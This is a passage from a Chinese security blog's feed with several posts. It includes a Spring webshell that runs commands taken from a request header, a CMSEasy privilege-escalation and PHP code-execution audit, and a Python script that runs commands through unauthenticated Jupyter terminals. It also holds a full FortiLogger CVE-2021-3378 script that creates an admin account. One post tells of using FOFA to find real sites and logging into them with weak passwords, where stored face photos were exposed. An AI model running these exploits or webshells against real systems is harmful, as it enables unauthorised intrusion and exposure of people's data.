<p>怎么观察中间件的response？在返回时打断点</p>
<figure data-type="image" tabindex="15"><a href="https://imgtu.com/i/Tu1oLD"><img src="https://s4.ax1x.com/2021/12/20/Tu1oLD.md.png" alt="Tu1oLD.md.png" loading="lazy"></a></figure>
<p><strong>通过及时表达式，手动查看当前线程上下文(也就是Thread.currentThread())的threadLocals</strong></p>
<figure data-type="image" tabindex="16"><a href="https://imgtu.com/i/Tu18sS"><img src="https://s4.ax1x.com/2021/12/20/Tu18sS.png" alt="Tu18sS.png" loading="lazy"></a></figure>
<p>通过查看threadlocals的tables的值找到request和response所在的位置，这里是14</p>
<figure data-type="image" tabindex="17"><a href="https://imgtu.com/i/Tu1Gqg"><img src="https://s4.ax1x.com/2021/12/20/Tu1Gqg.png" alt="Tu1Gqg.png" loading="lazy"></a></figure>
<p><strong>修改response的输出流</strong></p>
<pre><code class="language-java">((ServletRequestAttributes) Thread.currentThread().threadLocals.table[14].value).response.getOutputStream().println(&quot;change response----------------------------&quot;)
</code></pre>
<p><strong>这里可以用</strong> <strong>getOutputStream 或者 getwrite 具体看报错</strong></p>
<figure data-type="image" tabindex="18"><a href="https://imgtu.com/i/Tu1lxf"><img src="https://s4.ax1x.com/2021/12/20/Tu1lxf.png" alt="Tu1lxf.png" loading="lazy"></a></figure>
<p>最后放包得到响应，可以看到结果之前多了我们修改的字符</p>
<figure data-type="image" tabindex="19"><a href="https://imgtu.com/i/Tu1YZQ"><img src="https://s4.ax1x.com/2021/12/20/Tu1YZQ.png" alt="Tu1YZQ.png" loading="lazy"></a></figure>
<h3 id="可回显的spring马">可回显的spring马</h3>
<p>上面只是研究了一下怎么简单的更改回显。实际需要改的地方还是很多的。</p>
<p>实际上spring有自己获取request和response的地方</p>
<p>https://github.com/feihong-cs/Java-Rce-Echo</p>
<pre><code class="language-java">org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();
        
javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();
        
javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();

        String cmd = httprequest.getHeader(&quot;cmd&quot;);
		if(cmd != null &amp;&amp; !cmd.isEmpty()){
			String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;).next();
			httpresponse.getWriter().println(res);
		}
</code></pre>
<p>我们改改就可以用</p>
<figure data-type="image" tabindex="20"><a href="https://imgtu.com/i/Tu1fRx"><img src="https://s4.ax1x.com/2021/12/20/Tu1fRx.md.png" alt="Tu1fRx.md.png" loading="lazy"></a></figure>
<h3 id="效果">效果</h3>
<figure data-type="image" tabindex="21"><a href="https://imgtu.com/i/TKSREQ"><img src="https://s4.ax1x.com/2021/12/21/TKSREQ.png" alt="TKSREQ.png" loading="lazy"></a></figure>
<h1 id="0x05-结语">0x05 结语</h1>
<p>LOL</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[CMSEASY-从黑盒到代码审计]]></title>
        <id>https://ja9er.github.io/post/cmseasy-cong-hei-he-dao-dai-ma-shen-ji/</id>
        <link href="https://ja9er.github.io/post/cmseasy-cong-hei-he-dao-dai-ma-shen-ji/">
        </link>
        <updated>2022-01-13T10:03:35.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-开始的故事">0x01 开始的故事</h1>
<p><strong>中秋时节，秋高气爽，正是日(划)站(水)的好日子,刚好学习一波。</strong><br>
官网更新历史版本观察<br>
<img src="https://forum.ywhack.com/attachments/month_2109/2109181641160a30fdc89fa651.png" alt="" loading="lazy"><br>
两个版本都下<br>
使用beyond compare diff 文件内容<br>
结果发现并没有diff出什么内容来<br>
<img src="https://forum.ywhack.com/attachments/month_2109/21091816434e138746e1aefb18.png" alt="" loading="lazy"><br>
索性还是黑盒测一波吧<br>
看了看测出三个问题:</p>
<ul>
<li><strong>sql</strong></li>
<li><strong>代码执行</strong></li>
<li><strong>越权</strong></li>
</ul>
<hr>
<h1 id="0x02-看看越权">0x02 看看越权</h1>
<p>admin 超级管理员<br>
test  游客</p>
<figure data-type="image" tabindex="1"><img src="https://z3.ax1x.com/2021/09/22/4N7lnJ.png" alt="4N7lnJ.png" loading="lazy"></figure>
<p><strong>test</strong>用户无权登录后台</p>
<figure data-type="image" tabindex="2"><img src="https://z3.ax1x.com/2021/09/22/4N7u1U.png" alt="4N7u1U.png" loading="lazy"></figure>
<p>用test的cookie添加内容</p>
<figure data-type="image" tabindex="3"><img src="https://z3.ax1x.com/2021/09/22/4N71B9.png" alt="4N71B9.png" loading="lazy"></figure>
<p>看到这里添加成功</p>
<figure data-type="image" tabindex="4"><img src="https://z3.ax1x.com/2021/09/22/4N7MX4.png" alt="4N7MX4.png" loading="lazy"></figure>
<hr>
<p>展开讲讲：</p>
<p>add_action()鉴权只明确了是否存在该用户，并未对用户权限做限制<br>
<img src="https://z3.ax1x.com/2021/09/22/4N7ju4.png" alt="4N7ju4.png" loading="lazy"><br>
<img src="https://z3.ax1x.com/2021/09/22/4NHSER.png" alt="4NHSER.png" loading="lazy"></p>
<hr>
<h1 id="0x03-代码执行代码执行">0x03 代码执行！代码执行！</h1>
<p>内容管理模块，创建内容修改包内为PHPINFO<br>
<img src="https://z3.ax1x.com/2021/09/22/4N7KcF.png" alt="4N7KcF.png" loading="lazy"><br>
<img src="https://z3.ax1x.com/2021/09/22/4N737R.png" alt="4N737R.png" loading="lazy"><br>
<strong>分析</strong><br>
<strong>先摆结论:</strong></p>
<p>insert语句拼接时使用**.=**连接以及没有过滤好，是造成这个漏洞的原因</p>
<p>最后insert语句为:</p>
<pre><code class="language-sql">INSERT INTO `cmseasy_archive`(`checked`,`catid`,`title`,`color`,`langid`,`mtitle`,`keyword`,`description`,`tag`,`htmlrule`,`set_htmlrule`,`thumb`,`attachment_path`,`attachment_id`,`typeid`,`spid`,`subtitle`,`template`,`templatewap`,`nofollow`,`toppost`,`showform`,`introduce`,`adddate`,`updatedate`,`outtime`,`author`,`attr3`,`view`,`linkto`,`province_id`,`city_id`,`section_id`,`content`,`username`,`userid`,`strong`,`pics`,`attr1`,`introduce_len`,`type`,`state`,`listorder`,`readmenoy`,`domwmenoy`) VALUES ('1','1','phpinfo','#000000','1','','','','','','','','','','0','0','','0','0','0','0','0','','2021-09-18 11:23:13','2021-09-18 11:23:13','','admin','','','','0','0','0','&lt;?PHP PHPINFO();?&gt;','admin','1','0','N;','','0','','1','0','0','0')
</code></pre>
<figure data-type="image" tabindex="5"><img src="https://z3.ax1x.com/2021/09/22/4N7BBd.png" alt="4N7BBd.png" loading="lazy"></figure>
<p>从路由开始跟踪:</p>
<p>index.php下</p>
<p>$front-&gt;dispatch();根据参数中的值分配路由</p>
<pre><code class="language-php">try{
    $front = new front();
    $front-&gt;dispatch();
}catch(HttpErrorException $e){
    if(config::get('custom404') &amp;&amp; $e-&gt;statusCode == 404){
        header('location: /404.php');
    }else{
        exit($e-&gt;statusCode.':'.$e-&gt;getMessage());
    }
}
</code></pre>
<p>断点进去看看</p>
<figure data-type="image" tabindex="6"><img src="https://z3.ax1x.com/2021/09/22/4N7sAI.png" alt="4N7sAI.png" loading="lazy"></figure>
<p>可以看到front类就是index页面下调用的类，$case的值如下</p>
<pre><code class="language-php">$case = self::$case . (self::$admin &amp;&amp; self::$case &lt;&gt; 'admin' &amp;&amp; self::$case &lt;&gt; 'install' ? '_admin' : '_act');
</code></pre>
<p>self::$case在_construct()内获取也就是初始化的时候获取，若存在case则进入该路由，如果没有则返回index</p>
<p><img src="https://z3.ax1x.com/2021/09/22/4N764P.png" alt="4N764P.png" loading="lazy"><br>
<img src="https://z3.ax1x.com/2021/09/22/4N7yNt.png" alt="4N7yNt.png" loading="lazy"></p>
<p>同时在__constructc中获取参数</p>
<figure data-type="image" tabindex="7"><img src="https://z3.ax1x.com/2021/09/22/4N7238.png" alt="4N7238.png" loading="lazy"></figure>
<p>daddslashes()函数作为过滤函数，将输入的参数实体化</p>
<pre><code class="language-php">if (!function_exists('daddslashes')) {
    function daddslashes($string, $force = 1)
    {
        if (is_array($string)) {
            $keys = array_keys($string);
            foreach ($keys as $key) {
                $val = $string[$key];
                unset($string[$key]);
                $string[addslashes($key)] = daddslashes($val, $force);
            }
        }
        else {
            $string = htmlspecialchars(addslashes(trim($string)), ENT_QUOTES);
            if (!front::$isadmin || (front::$case == 'admin' &amp;&amp; front::$act == 'login')) {
                front::check_type($string, 'safe');
                if (inject_check($string)) {
                    //var_dump($string);
                    event::log('inject', $string);
                    echo $string;exit;

                }

            }
            if (preg_match('/^data:(.*?)/is', $string)) {
                exit('data:');
            }
        }
        return $string;
    }
</code></pre>
<p>此时传入的<code>&lt;?php phpinfo();?&gt;</code>已经变成<code>&lt;?php phpinfo();?&gt;</code><br>
接下来在index.php中调用dispatch()方法</p>
<pre><code class="language-php"> function dispatch()
    {
        $case = self::$case . (self::$admin &amp;&amp; self::$case &lt;&gt; 'admin' &amp;&amp; self::$case &lt;&gt; 'install' ? '_admin' : '_act');
        if (!class_exists($case)) {
            throw new HttpErrorException(404, lang('page_does_not_exist'), 404);
        } else {
            $method = self::$act . '_action';
            $case = new $case();
            $case-&gt;init();
            if (method_exists($case, $method))
                $case-&gt;$method();
            else
                throw new HttpErrorException(404, lang('page_does_not_exist'), 404);
            $case-&gt;end();
            //var_dump(get_class($case));
            if (get_class($case) != 'install_act' &amp;&amp; get_class($case) != 'crontab_act') {

                if(config::get('site_push')) {
                    $last = @file_get_contents(ROOT . '/cache/data/xiongzhang.log');
                    if(!$last || $last &lt; date('Y-m-d')){
                        $site = getSiteUrl() . '/index.php?case=crontab&amp;act=xiongzhang';
                        $site .= &quot;&amp;token=&quot;.config::get('cookie_password');
                        _sock($site);
                    }
                }
                //var_dump($site);
                $this-&gt;autocleanstats();//自动清楚蜘蛛记录
                $this-&gt;autobakdatabase();//自动备份数据库
                $this-&gt;doarchivetimeout();//处理过期新闻
                $this-&gt;autocreatehtml();//自动生成HTML
                $this-&gt;automap(); //自动生成百度谷歌地图
            }
        }
    }
</code></pre>
<p>可以观察到$case实例化后，method_exists判断有无传入的方法，然后直接执行该方法</p>
<p>这里传递参数为<strong>act=add</strong></p>
<figure data-type="image" tabindex="8"><img src="https://z3.ax1x.com/2021/09/22/4N74Bj.png" alt="4N74Bj.png" loading="lazy"></figure>
<p>所以应该执行<strong>add_action</strong>函数。</p>
<p>进入函数内部后发现<strong>add_action</strong>函数内使用save_before函数对fron::$get参数进行处理</p>
<figure data-type="image" tabindex="9"><img src="https://z3.ax1x.com/2021/09/22/4N7740.png" alt="4N7740.png" loading="lazy"></figure>
<p>而save_before也就是造成这个漏洞的最终原因之一，很神奇的他又把实例化的字符解码回去了。</p>
<p>突出两个字</p>
<p><strong>神奇</strong></p>
<figure data-type="image" tabindex="10"><img src="https://z3.ax1x.com/2021/09/22/4N7OvF.png" alt="4N7OvF.png" loading="lazy"></figure>
<figure data-type="image" tabindex="11"><img src="https://z3.ax1x.com/2021/09/22/4N7LgU.png" alt="4N7LgU.png" loading="lazy"></figure>
<p>剩下的就是在add_action中调用插入数据库操作，一路跟跟跟跟，跟到最后的sql_insert发现使用**.=**连接参数</p>
<figure data-type="image" tabindex="12"><img src="https://z3.ax1x.com/2021/09/22/4N7bCV.png" alt="4N7bCV.png" loading="lazy"></figure>
<figure data-type="image" tabindex="13"><img src="https://z3.ax1x.com/2021/09/22/4N7q3T.png" alt="4N7q3T.png" loading="lazy"></figure>
<figure data-type="image" tabindex="14"><img src="https://z3.ax1x.com/2021/09/22/4N7xb9.png" alt="4N7xb9.png" loading="lazy"></figure>
<hr>
<p>除了这个点之外，edit_action也用到savebefore。所以只要路由中带有<strong>act=edit</strong>和<strong>act=add</strong>的参数的都存在代码执行漏洞</p>
<h1 id="0x04-sql你为什么报错">0x04 SQL,你为什么报错!</h1>
<p>POC:</p>
<pre><code class="language-sql">/index.php?case=table&amp;act=edit&amp;table=archive&amp;catid=16&amp;admin_dir=admin&amp;site=default&amp;username=&amp;url=&amp;isvisual=&amp;aid=&amp;dfile=&amp;page=1&amp;id=999
</code></pre>
<p>注入点 在id=999</p>
<p>内置过滤，暂时无法利用</p>
<figure data-type="image" tabindex="15"><img src="https://z3.ax1x.com/2021/09/22/4N7GA1.png" alt="4N7GA1.png" loading="lazy"></figure>
<p>首先打印所有sql语句</p>
<figure data-type="image" tabindex="16"><img src="https://z3.ax1x.com/2021/09/22/4N7Jtx.png" alt="4N7Jtx.png" loading="lazy"></figure>
<p>观察到报错点</p>
<figure data-type="image" tabindex="17"><img src="https://z3.ax1x.com/2021/09/22/4N7acD.png" alt="4N7acD.png" loading="lazy"></figure>
<p>报错的原因在于catid为空</p>
<figure data-type="image" tabindex="18"><img src="https://z3.ax1x.com/2021/09/22/4N7Yh6.png" alt="4N7Yh6.png" loading="lazy"></figure>
<p>aid=999时查询到结果为空</p>
<figure data-type="image" tabindex="19"><img src="https://z3.ax1x.com/2021/09/22/4N7N9K.png" alt="4N7N9K.png" loading="lazy"></figure>
<p>实际上在执行</p>
<pre><code class="language-sql">SELECT *,my_field,my_tagone,my_shopping_model,my_shopping_color FROM `cmseasy_archive`  WHERE `aid`='999' and (state IS NULL or state&lt;&gt;'-1')  ORDER BY 1 desc LIMIT 1;
</code></pre>
<p>后直接取值获取catid的值</p>
<figure data-type="image" tabindex="20"><img src="https://z3.ax1x.com/2021/09/22/4N7U1O.png" alt="4N7U1O.png" loading="lazy"></figure>
<p>但是cms中内置了过滤，且对URL中的特殊符号做了处理，无法绕过。</p>
<figure data-type="image" tabindex="21"><img src="https://z3.ax1x.com/2021/09/22/4N70nH.png" alt="4N70nH.png" loading="lazy"></figure>
<p>所以虽然存在注入点但是无法利用........................</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[从漏洞预警到POC实现]]></title>
        <id>https://ja9er.github.io/post/cong-lou-dong-yu-jing-dao-poc-shi-xian/</id>
        <link href="https://ja9er.github.io/post/cong-lou-dong-yu-jing-dao-poc-shi-xian/">
        </link>
        <updated>2022-01-13T10:03:14.000Z</updated>
        <content type="html"><![CDATA[<h1 id="从漏洞预警到poc实现">从漏洞预警到POC实现</h1>
<h2 id="0x01-人生是一个摆满餐具的茶几">0X01 人生是一个摆满餐具的茶几</h2>
<p>2021年7月13日网信办发文。9月1日落地</p>
<blockquote>
<p>1、不得发布或者提供专门用于利用网络产品安全漏洞从事危害网络安全活动的程序和工具。</p>
<p>2、在国家举办重大活动期间，未经公安部同意，不得擅自发布网络产品安全漏洞信息。</p>
<p>3、不得将未公开的网络产品安全漏洞信息向网络产品提供者之外的境外组织或者个人提供。</p>
</blockquote>
<p>总结来说就是不要乱发漏洞EXP和POC，网上的文库和师傅一夜之间跑路大半。属于是脚本小子の大末日了。</p>
<p>那么，作为一个菜鸡，要怎么在茫茫网海中扩充自己的武器库呢</p>
<h2 id="0x02-简单讲讲一个思路">0X02 简单讲讲一个思路</h2>
<p><strong>CNVD,WangAn等漏洞平台</strong></p>
<p>这些平台都会预警某某系统存在某某漏洞，仔细找找就能发现惊喜<br>
<a href="https://imgtu.com/i/f0SrTS"><img src="https://z3.ax1x.com/2021/08/12/f0SrTS.png" alt="f0SrTS.png" loading="lazy"></a><br>
<a href="https://imgtu.com/i/f0S6YQ"><img src="https://z3.ax1x.com/2021/08/12/f0S6YQ.png" alt="f0S6YQ.png" loading="lazy"></a></p>
<h2 id="0x03-简单的实现">0X03 简单的实现</h2>
<p>这里我们随便点一个进去，可以看到是一个未授权访问的漏洞，并且影响产品给出了一个很详细信息<br>
<a href="https://imgtu.com/i/f0SDw8"><img src="https://z3.ax1x.com/2021/08/12/f0SDw8.png" alt="f0SDw8.png" loading="lazy"></a><br>
接下来就是想想怎么复现它了，首先搜了搜同系统的名字发现还有弱口令<br>
<a href="https://imgtu.com/i/f0SBef"><img src="https://z3.ax1x.com/2021/08/12/f0SBef.png" alt="f0SBef.png" loading="lazy"></a><br>
这波啊，这波是稳稳地幸福！我们直接fofa见好伐。</p>
<blockquote>
<p>FOFA 是白帽汇推出的一款网络空间资产搜索引擎。它能够帮助用户迅速进行网络资产匹配、加快后续工作进程。例如进行漏洞影响范围分析、应用分布统计、应用流行度排名统计等。<br>
简单理解就是，一个本土加强版shodan，知道某产品在互联网的部署情况、获取一个根域名所有子域名网站、根据IP确认企业、根据一个子域名网站找到跟他在一个IP的其他网站、全网漏洞扫描、一个新的漏洞全网的影响范围。</p>
</blockquote>
<p>简单来说，fofa就是一个IP PLUS+++版本的谷歌。我们可以利用它寻找到具有相同网页结构特征的网站，也就是我们可以构造指纹来发现相同的系统。</p>
<p>首先建议使用<code>body=&quot;xxxxx系统&quot;</code>或者<code>title=&quot;xxx系统&quot;</code>来找到目标系统，然后观察该网站的结构细化指纹进而获取到全网的站点</p>
<p>搜索结果如下<br>
<a href="https://imgtu.com/i/f0SyFg"><img src="https://z3.ax1x.com/2021/08/12/f0SyFg.png" alt="f0SyFg.png" loading="lazy"></a><br>
随便找个站点点进去，观察一下网页结构，我们继续细化指纹<br>
<a href="https://imgtu.com/i/f0ScWj"><img src="https://z3.ax1x.com/2021/08/12/f0ScWj.png" alt="f0ScWj.png" loading="lazy"></a><br>
然后尝试弱口令登录，试了几个站进了后台<br>
<a href="https://imgtu.com/i/f0S2Ss"><img src="https://z3.ax1x.com/2021/08/12/f0S2Ss.png" alt="f0S2Ss.png" loading="lazy"></a><br>
这时候回到刚开始的漏洞预警，<code>未授权访问获取敏感信息</code>，就往这个方向进行黑盒测试</p>
<p>抓包测试发现还是有session验证的<br>
<a href="https://imgtu.com/i/f0SRln"><img src="https://z3.ax1x.com/2021/08/12/f0SRln.png" alt="f0SRln.png" loading="lazy"></a><br>
不过发现一个点具有导出功能，导出的文件保存在网站的路径下<br>
<a href="https://imgtu.com/i/f0SfO0"><img src="https://z3.ax1x.com/2021/08/12/f0SfO0.png" alt="f0SfO0.png" loading="lazy"></a><br>
这时候直接访问该路径，发现可以访问，然后回退目录顺利的发现了一个列目录漏洞<br>
<a href="https://imgtu.com/i/f0SWyq"><img src="https://z3.ax1x.com/2021/08/12/f0SWyq.png" alt="f0SWyq.png" loading="lazy"></a><br>
photo路径下存在大量的人脸照片，清除cookie测试是否存在未授权<br>
<a href="https://imgtu.com/i/f0S4mV"><img src="https://z3.ax1x.com/2021/08/12/f0S4mV.png" alt="f0S4mV.png" loading="lazy"></a><br>
<a href="https://imgtu.com/i/f0S5wT"><img src="https://z3.ax1x.com/2021/08/12/f0S5wT.png" alt="f0S5wT.png" loading="lazy"></a></p>
<h2 id="0x04-poc">0x04 POC</h2>
<p>如果自己没有开发扫描器的话，建议还是按照POCSUITE3格式写</p>
<p>Github 地址 : https://github.com/knownsec/pocsuite3</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[一次从未授权开始的研究]]></title>
        <id>https://ja9er.github.io/post/yi-ci-cong-wei-shou-quan-kai-shi-de-yan-jiu/</id>
        <link href="https://ja9er.github.io/post/yi-ci-cong-wei-shou-quan-kai-shi-de-yan-jiu/">
        </link>
        <updated>2022-01-13T10:02:30.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-开始">0x01 开始</h1>
<p>摸鱼看到文章</p>
<blockquote>
<p>Jupyter-Notebook是基于网页的用于交互计算的应用程序。其可被应用于全过程计算：开发、文档编写、运行代码和展示结果。——<a href="https://link.jianshu.com/?t=https%3A%2F%2Fjupyter-notebook.readthedocs.io%2Fen%2Fstable%2Fnotebook.html">Jupyter Notebook官方介绍</a></p>
</blockquote>
<p>简而言之，Jupyter Notebook是以网页的形式打开，可以在网页页面中<strong>直接</strong>编写代码和运行代码，代码的运行结果也会直接在代码块下显示。</p>
<blockquote>
<p>如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令。</p>
</blockquote>
<p>随便找找，好家伙这么多<br>
<a href="https://imgtu.com/i/R7URb9"><img src="https://z3.ax1x.com/2021/07/06/R7URb9.md.png" alt="R7URb9.md.png" loading="lazy"></a></p>
<h1 id="0x02-复现以及一点小研究">0x02 复现，以及一点小研究</h1>
<p>找一个站点，所谓的未授权，大大的Terminal非常动人<br>
<a href="https://imgtu.com/i/R7U7vD"><img src="https://z3.ax1x.com/2021/07/06/R7U7vD.md.png" alt="R7U7vD.md.png" loading="lazy"></a><br>
查看权限，root。按理来说这次简单的复现到此为止，但是今天比较好奇，因为一直以来有个疑问，阿里云这类网页实现的console是怎么和服务器交互的。<br>
<a href="https://imgtu.com/i/R7U2DJ"><img src="https://z3.ax1x.com/2021/07/06/R7U2DJ.md.png" alt="R7U2DJ.md.png" loading="lazy"></a><br>
刚开始习惯性的开了Burp抓抓包，不过没办法加载出console界面，看来不是走的HTTP协议。打开wireshark跟踪流看看，可以看到返回包的标志是[&quot;stdout&quot;,&quot; &quot;],输入什么，响应什么，外加输入的结果一并返回<br>
<a href="https://imgtu.com/i/R7UqDH"><img src="https://z3.ax1x.com/2021/07/06/R7UqDH.md.png" alt="R7UqDH.md.png" loading="lazy"></a><br>
单输入一个l测试，注意这里并没有回车<br>
<a href="https://imgtu.com/i/R7UbKe"><img src="https://z3.ax1x.com/2021/07/06/R7UbKe.md.png" alt="R7UbKe.md.png" loading="lazy"></a><br>
知道是怎么获取结果的了，但是还是不清楚这里的输入是怎么发出去的。因为之前上burp没加载到网页，猜测和JS有关。于是翻了翻JS文件，果然找到一个terminado.js。一看代码就特别清楚了，妥妥的websocket标准用法。函数make_terminal的两个参数，element和ws_url。element用于生成节点，ws_url使用时传入的实参是由另一个config.js中配置的websocket 的url</p>
<pre><code class="language-python">define ('terminal/js/terminado',[&quot;xterm&quot;, &quot;xtermjs-fit&quot;], function(Terminal, fit) {
    &quot;use strict&quot;;
    function make_terminal(element, ws_url) {
        
        var ws = new WebSocket(ws_url);
        Terminal.applyAddon(fit);
        var term = new Terminal();
        ws.onopen = function(event) {
            term.on('data', function(data) {
                ws.send(JSON.stringify(['stdin', data]));
            });
            
            term.on('title', function(title) {
                document.title = title;
            });
            
            term.open(element);
            term.fit();
            // send the terminal size to the server.
            ws.send(JSON.stringify([&quot;set_size&quot;, term.rows, term.cols,
                                        window.innerHeight, window.innerWidth]));

            ws.onmessage = function(event) {
                var json_msg = JSON.parse(event.data);
                switch(json_msg[0]) {
                    case &quot;stdout&quot;:
                        term.write(json_msg[1]);
                        break;
                    case &quot;disconnect&quot;:
                        term.write(&quot;\r\n\r\n[CLOSED]\r\n&quot;);
                        break;
                }
            };
        };
        return {socket: ws, term: term};
    }

    return {make_terminal: make_terminal};
});


</code></pre>
<p>这其中 <code>ws.send(JSON.stringify(['stdin', data]));</code>传递输入的消息,<code>ws.onmessage</code>获取websocket端返回的消息。我们可以打个断点看看。</p>
<p>首先按下回车<br>
<a href="https://imgtu.com/i/R7UfER"><img src="https://z3.ax1x.com/2021/07/06/R7UfER.png" alt="R7UfER.png" loading="lazy"></a></p>
<p>控制台打出来，看看ws 到底send了个啥玩意儿。<br>
<a href="https://imgtu.com/i/R7UhU1"><img src="https://z3.ax1x.com/2021/07/06/R7UhU1.png" alt="R7UhU1.png" loading="lazy"></a></p>
<p>&quot;\\r&quot;,回车的转义符号。看起来&quot;[&quot;stdin&quot;,&quot;\r&quot;]&quot;就是send到server端的奥秘。此时，一个大胆且完整的想法已经回荡在我的脑海里了，只差最后一个拼图。写作也讲究人物地点时间三要素，显然，send，你也要有个send出去的地址，这就是websocket的server端。</p>
<p>在之前的js中有这么一段<code>var ws = new WebSocket(ws_url);</code>，很显然这就是我们要追寻的答案</p>
<pre><code class="language-python">ws://ip:port/terminals/websocket/5 #server端地址
</code></pre>
<figure data-type="image" tabindex="1"><a href="https://imgtu.com/i/R7U44x"><img src="https://z3.ax1x.com/2021/07/06/R7U44x.png" alt="R7U44x.png" loading="lazy"></a></figure>
<h1 id="0x03-python实现命令执行">0x03 Python实现命令执行</h1>
<p>最后，用python实现简单的控制,这段代码还是有bug的。后面再改吧，同步问题实在太坑了</p>
<pre><code class="language-python">from websocket import create_connection
cmd=&quot;whoami&quot;
target = 'ws://IP:PORT/terminals/websocket/4'
ws = create_connection(target)
ws.send(&quot;[\&quot;stdin\&quot;,\&quot;{} \\r \&quot;]&quot;.format(cmd))
lists=[]
for i in range(0,4):
    res = ws.recv()
    lists.append(res)
key=-1
for index,j in enumerate(lists):
    if cmd in j:
        key=index
        break
print lists[key+1]
</code></pre>
<figure data-type="image" tabindex="2"><a href="https://imgtu.com/i/R7UIC6"><img src="https://z3.ax1x.com/2021/07/06/R7UIC6.png" alt="R7UIC6.png" loading="lazy"></a></figure>
<hr>
<p>修改后的代码，基本可控了</p>
<pre><code class="language-python">from websocket import create_connection
result=&quot;&quot;
cmd=&quot;whoami&quot;
target = 'ws://IP:PORT/terminals/websocket/4'
ws = create_connection(target)

ws.send(&quot;[\&quot;stdin\&quot;,\&quot;{} \\r \&quot;]&quot;.format(cmd))

def get_list(NUM):
    lists=[]
    for i in range(0, NUM):
        res = ws.recv()
        lists.append(res)
    return lists

def find_result(lists):
    key = -1
    for index, j in enumerate(lists):
        if cmd in j:
            key = index
            break
    return key

while True:
    try:
        list = get_list(4)
        key = find_result(list)
        if key &gt;= 0:
            if key + 1 &gt; 3:
                list = get_list(1)
                result = list[0]
                break
            else:
                result = list[key + 1]
                break
    except Exception as e:
        break


print result


</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[(CVE-2021-3378) FortiLogger 任意用户创建 POC]]></title>
        <id>https://ja9er.github.io/post/cve-2021-3378-fortilogger-ren-yi-yong-hu-chuang-jian-poc/</id>
        <link href="https://ja9er.github.io/post/cve-2021-3378-fortilogger-ren-yi-yong-hu-chuang-jian-poc/">
        </link>
        <updated>2022-01-13T10:01:55.000Z</updated>
        <content type="html"><![CDATA[<h1 id="之前写的小玩意儿-放出来康康">之前写的小玩意儿。放出来康康</h1>
<blockquote>
<p>RZK Fortilogger是土耳其RZK公司的一个可为Windows系统上FortiGate防火墙进行即时状态跟踪，日志记录，搜索/过滤，报告和热点等功能的建站系统。</p>
</blockquote>
<p>FortiLogger 4.4.2.2 存在安全漏洞，该漏洞源于受任意文件上传的影响。<br>
很简单，就是接口未授权的问题，同理还有任意文件上传。</p>
<p>存储用户的接口</p>
<blockquote>
<p>/User/saveUser</p>
</blockquote>
<p>payload中的superadmin_profile，也就是管理员凭证，可以在接口</p>
<blockquote>
<p>/User/getProfile</p>
</blockquote>
<p>中查看，只需要把payload换成</p>
<blockquote>
<p>{<br>
'id':'all',<br>
}</p>
</blockquote>
<p>直接上脚本</p>
<pre><code class="language-python"># -*- coding: UTF-8 -*-
# !/usr/bin/python

import urllib3, argparse,json
import requests, sys, random

reload(sys)
sys.setdefaultencoding('utf8')
urllib3.disable_warnings()


def randomrequest():
    all_char = '0123456789qazwsxedcrfvtgbyhnujmikolpQAZWSXEDCRFVTGBYHNUJIKOLP'
    index = len(all_char)
    passward = ''
    for _ in range(4):
        n = random.randint(0, index - 1)
        passward += all_char[n]
    return passward


def poc(args):
    result = {'match': False, 'comment': '不存在此漏洞', 'others': {}}
    headers = {
        'Content-type': 'application/json',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'X-Requested-With': 'XMLHttpRequest'
    }
    headers2 = {
        # &quot;Host&quot;: &quot;%s:%s&quot; % (target, port,),
        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36&quot;,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'X-Requested-With': 'XMLHttpRequest',
        'Connection': 'close',
    }
    rand = randomrequest()
    payload = '''{
              '_profilename':'superadmin_profile', 
              '_username': \'''' + rand + '''\', 
              '_password': 'test', 
              '_fullname':'', 
              '_email':''
              }'''
    data2 = &quot; &quot;

    url = str(args)
    try:
        req1 = requests.post(url + '/User/saveUser', headers=headers, verify=False, timeout=20, data=payload, )
        if req1.status_code == 200 and &quot;false&quot; in req1.text:
            req2 = requests.post(url + '/User/getUsers', headers=headers2, verify=False, timeout=20, data=data2, )
            if req2.status_code == 200 and rand in req2.text:
                result['match'] = True
                result['comment'] = 'user create:  ' + rand + ' ,password: test '
                return result
    except Exception, e:
        result['comment'] = e
        return result

    return result


if __name__ == &quot;__main__&quot;:
    result = {'match': False, 'comment': 'Not vulnerable', 'others': {}}
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', '--url', default='http://192.168.1.1:5000', help=&quot;input url like [url=http://192.168.1.1:5000]http://192.168.1.1:5000[/url]&quot;)
    args = parser.parse_args()
    result = poc(args.url)
    print json.dumps(result['comment'])
</code></pre>
<p>验证截图<br>
<a href="https://imgtu.com/i/R5LQKg"><img src="https://z3.ax1x.com/2021/07/05/R5LQKg.md.png" alt="R5LQKg.md.png" loading="lazy"></a><br>
<a href="https://imgtu.com/i/R5LlrQ"><img src="https://z3.ax1x.com/2021/07/05/R5LlrQ.md.png" alt="R5LlrQ.md.png" loading="lazy"></a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[从TPshopcms到GetShell]]></title>
        <id>https://ja9er.github.io/post/cong-tpshopcms-dao-getshell/</id>
        <link href="https://ja9er.github.io/post/cong-tpshopcms-dao-getshell/">
        </link>
        <updated>2022-01-13T10:00:27.000Z</updated>
        <content type="html"><![CDATA[<h1 id="0x01-开始">0X01 开始</h1>
<p>日常工作中日站，找到一个冷门cms-tpshop。<br>
